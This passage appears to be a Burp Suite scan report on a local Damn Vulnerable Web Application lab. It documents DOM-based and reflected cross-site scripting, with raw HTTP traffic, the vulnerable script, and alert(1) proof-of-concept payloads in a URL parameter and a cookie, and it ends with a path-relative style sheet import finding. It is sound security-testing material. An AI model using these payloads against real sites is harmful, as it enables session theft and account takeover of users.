<span class="TEXT"><p>The most effective way to avoid DOM-based cross-site scripting vulnerabilities is not to dynamically write data from any untrusted source into the HTML document. If the desired functionality of the application means that this behavior is unavoidable, then defenses must be implemented within the client-side code to prevent malicious data from introducing script code into the document. In many cases, the relevant data can be validated on a whitelist basis, to allow only content that is known to be safe. In other cases, it will be necessary to sanitize or encode the data. This can be a complex task, and depending on the context that the data is to be inserted may need to involve a combination of JavaScript escaping, HTML encoding, and URL encoding, in the appropriate sequence. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/dom-based">Web Security Academy: DOM-based cross-site scripting</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
	<li><a href="https://capec.mitre.org/data/definitions/588.html">CAPEC-588: DOM-Based XSS</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="31.1.1">31.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_d/</span>
<br><a class="PREVNEXT" href="#30.1.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31.1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_d/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to DOM-based cross-site scripting. Data is read from <b>document.location.href</b> and passed to <b>document.write()</b>.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=q0bje5vfn97siku0399kerqck5<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:58 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;script&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (document.location.href.indexOf("default=") &gt;= 0) {<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">document.write("&lt;option value='" + lang + "'&gt;" + decodeURI(lang) + "&lt;/option&gt;");</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;document.write("&lt;option value='' disabled='disabled'&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Static analysis</h2>Data is read from <b>document.location.href</b> and passed to <b>document.write()</b> via the following statements:<ul><li><pre>var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</pre></li><li><pre>document.write("&lt;option value='" + lang + "'&gt;" + decodeURI(lang) + "&lt;/option&gt;");</pre></li></ul><h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/?default=English HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=0nsblakqclqh3rdvsvjomkptj6<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_d/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:36 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<h2>Dynamic analysis</h2><p>Data is read from <b>location.href</b> and passed to <b>document.write</b>.</p><p>The following value was injected into the source:</p><pre>?default=kyp2d152up%27%22`'"/kyp2d152up/&gt;&lt;kyp2d152up/\&gt;jyi7lnsvkn&amp;English</pre><p>The previous value reached the sink as:</p><pre>&lt;option value='kyp2d152up%27%22`'"/kyp2d152up/&gt;&lt;kyp2d152up/\&gt;jyi7lnsvkn&amp;English'&gt;kyp2d152up'"`'"/kyp2d152up/&gt;&lt;kyp2d152up/\&gt;jyi7lnsvkn&amp;English&lt;/option&gt;</pre><p>The stack trace at the source was:</p><pre>at Object._0x33d7c2 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:588475)<br>at Object.get href [as href] (&lt;anonymous&gt;:1:298487)<br>at http://localhost:7878/dvwa/vulnerabilities/xss_d/?default=English:69:36</pre><p>The stack trace at the sink was:</p><pre>at Object.Lixzr (&lt;anonymous&gt;:1:175099)<br>at Object.jNwri (&lt;anonymous&gt;:1:573993)<br>at _0x5d9df9 (&lt;anonymous&gt;:1:590480)<br>at Object.GvThk (&lt;anonymous&gt;:1:172421)<br>at Object.mHBUy (&lt;anonymous&gt;:1:493848)<br>at Object.SPRUB (&lt;anonymous&gt;:1:507129)<br>at Object.yRKLW (&lt;anonymous&gt;:1:508761)<br>at HTMLDocument.write (&lt;anonymous&gt;:1:509996)<br>at http://localhost:7878/dvwa/vulnerabilities/xss_d/?default=English:70:16</pre><p>The following proof of concept was generated for this issue:</p><pre>http://localhost:7878/dvwa/vulnerabilities/xss_d/?default='"/onmouseover=alert(1)//English</pre><div class="rule"></div>
<span class="BODH2" id="31.1.2">31.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/xss_d/</span>
<br><a class="PREVNEXT" href="#31.1.1">Previous</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_d/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to DOM-based cross-site scripting. Data is read from <b>document.location.href</b> and passed to <b>document.write()</b>.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=q0bje5vfn97siku0399kerqck5<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:58 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;script&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;if (document.location.href.indexOf("default=") &gt;= 0) {<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">document.write("&lt;option value='" + lang + "'&gt;" + decodeURI(lang) + "&lt;/option&gt;");</span><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;document.write("&lt;option value='' disabled='disabled'&gt;<br><b>...[SNIP]...</b><br></span></div>
<h2>Static analysis</h2>Data is read from <b>document.location.href</b> and passed to <b>document.write()</b> via the following statements:<ul><li><pre>var lang = document.location.href.substring(document.location.href.indexOf("default=")+8);</pre></li><li><pre>document.write("&lt;option value='" + lang + "'&gt;" + decodeURI(lang) + "&lt;/option&gt;");</pre></li></ul><h2>Request 2</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/?default=English HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=0nsblakqclqh3rdvsvjomkptj6<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/xss_d/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 2</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:30:36 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4594<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br></span></div>
<h2>Dynamic analysis</h2><p>Data is read from <b>location.href</b> and passed to <b>document.write</b>.</p><p>The following value was injected into the source:</p><pre>?default=kyp2d152up%27%22`'"/kyp2d152up/&gt;&lt;kyp2d152up/\&gt;jyi7lnsvkn&amp;English</pre><p>The previous value reached the sink as:</p><pre>&lt;option value='kyp2d152up%27%22`'"/kyp2d152up/&gt;&lt;kyp2d152up/\&gt;jyi7lnsvkn&amp;English'&gt;kyp2d152up'"`'"/kyp2d152up/&gt;&lt;kyp2d152up/\&gt;jyi7lnsvkn&amp;English&lt;/option&gt;</pre><p>The stack trace at the source was:</p><pre>at Object._0x33d7c2 [as proxiedGetterCallback] (&lt;anonymous&gt;:1:588475)<br>at Object.get href [as href] (&lt;anonymous&gt;:1:298487)<br>at http://localhost:7878/dvwa/vulnerabilities/xss_d/?default=English:69:36</pre><p>The stack trace at the sink was:</p><pre>at Object.Lixzr (&lt;anonymous&gt;:1:175099)<br>at Object.jNwri (&lt;anonymous&gt;:1:573993)<br>at _0x5d9df9 (&lt;anonymous&gt;:1:590480)<br>at Object.GvThk (&lt;anonymous&gt;:1:172421)<br>at Object.mHBUy (&lt;anonymous&gt;:1:493848)<br>at Object.SPRUB (&lt;anonymous&gt;:1:507129)<br>at Object.yRKLW (&lt;anonymous&gt;:1:508761)<br>at HTMLDocument.write (&lt;anonymous&gt;:1:509996)<br>at http://localhost:7878/dvwa/vulnerabilities/xss_d/?default=English:70:16</pre><p>The following proof of concept was generated for this issue:</p><pre>http://localhost:7878/dvwa/vulnerabilities/xss_d/?default='"/onmouseover=alert(1)//English</pre><div class="rule"></div>
<span class="BODH1" id="31.2">31.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#31.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_d/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>n61ri'&gt;&lt;script&gt;alert(1)&lt;/script&gt;lr1b9</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">n61ri'%3e%3cscript%3ealert(1)%3c%2fscript%3elr1b9</span>; PHPSESSID=bhnm86965q0nmp6rt9k5o39sma<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:20 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=bhnm86965q0nmp6rt9k5o39sma; path=/<br>Set-Cookie: security=low<br>Content-Length: 4666<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: DOM Based Cross Site Scripting (XSS) :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=xss_d&amp;security=low<span class="HIGHLIGHT">n61ri'&gt;&lt;script&gt;alert(1)&lt;/script&gt;lr1b9</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="31.3">31.3.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200328_pathrelativestylesheetimport">Path-relative style sheet import</a></span>
<br><a class="PREVNEXT" href="#31.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#31.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_info_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Information</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/xss_d/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>
<ol>
<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at "/original-path/file.php" might import "styles/main.css").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, "/original-path/file.php/extra-junk/"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>
<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL "/original-path/file.php/extra-junk/styles/main.css"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>
<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>
<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>
<ul>
  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>
<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>
<ul><li>Setting the HTTP response header "X-Frame-Options: deny" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. "&lt;!doctype html&gt;") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>
<li>Setting the HTTP response header "X-Content-Type-Options: nosniff" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul></span>
<h2>References</h2>
<span class="TEXT"><ul><li><a href="https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/154.html">CAPEC-154: Resource Location Spoofing</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/468.html">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/xss_d/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=bhnm86965q0nmp6rt9k5o39sma<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
